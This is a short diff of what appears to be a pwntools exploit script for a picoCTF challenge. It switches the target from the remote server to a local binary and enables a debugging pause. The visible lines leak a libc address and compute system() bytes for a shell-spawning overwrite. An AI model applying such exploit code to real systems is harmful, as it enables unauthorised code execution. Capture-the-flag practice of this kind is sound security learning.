@@ -10,8 +10,9 @@ offset_system = 0x0000000000055410
 # offset___libc_start_main_ret_local = 0xac0b3c2270
 # offset_system_local = 0x050d60
 
-r = remote("mars.picoctf.net", 31929)
-# r = process('./chall')
+# r = remote("mars.picoctf.net", 31929)
+r = process('./chall')
+# r = process('./C',env={"LD_PRELOAD" : "./libc-2.31.so"})
 
 '''#############
 leak libc address
@@ -35,7 +36,7 @@ success(f"libc system address = {hex(libc_addr + offset_system)}")
 '''#############
 Get Shell
 #############'''
-# raw_input()
+raw_input()
 third = (libc.sym['system']>>16)&0xff
 bottom = libc.sym['system'] & 0xffff
 first = third - 21
